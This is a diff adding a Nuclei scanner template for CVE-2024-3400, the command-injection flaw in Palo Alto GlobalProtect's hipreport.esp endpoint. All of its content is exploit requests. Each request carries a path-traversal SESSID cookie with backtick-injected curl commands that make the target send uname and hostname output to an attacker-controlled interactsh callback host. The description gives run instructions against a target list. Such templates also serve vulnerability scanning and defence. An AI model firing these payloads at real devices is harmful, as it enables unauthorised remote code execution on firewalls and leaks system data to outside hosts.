@@ -1,0 +1,56 @@
+id: CVE20243400
+info:
+    name: telemetry
+    author: 自行车,자전거,自転車
+    severity: medium
+    description: palo alto telemetry os injection. run interactsh-client -v, and nuclei -V telemetry=your-interact-hostname -l target.txt
+    reference: https://en.fofa.info/result?qbase64=YmFubmVyPSJHbG9iYWwgUHJvdGVjdCI%3D
+    tags: telemetry
+requests:
+  - raw:
+      - |
+        POST /ssl-vpn/hipreport.esp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/uname`curl${IFS}{{telemetry}}?c=$(uname)`;
+
+        foo=bar
+
+
+      - |
+        POST /ssl-vpn/hipreport.esp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hostname`curl${IFS}$(hostname).{{telemetry}}`;
+
+        foo=bar
+
+
+      - |
+        POST /ssl-vpn/hipreport.esp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/CVE20243400`curl${IFS}{{telemetry}}`;
+
+        foo=bar
+
+
+      - |
+        POST /ssl-vpn/hipreport.esp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/unamezr`curl${IFS}{{telemetry}}?c=$(uname)`;
+        Content-Length: 0
+
+
+                                                                
+      - |
+        POST /ssl-vpn/hipreport.esp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hostnamezr`curl${IFS}$(hostname).{{telemetry}}`;
+        Content-Length: 0
+
+
+        
+
+      - |
+        POST /ssl-vpn/hipreport.esp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/CVE20243400zr`curl${IFS}{{telemetry}}`;
+        Content-Length: 0
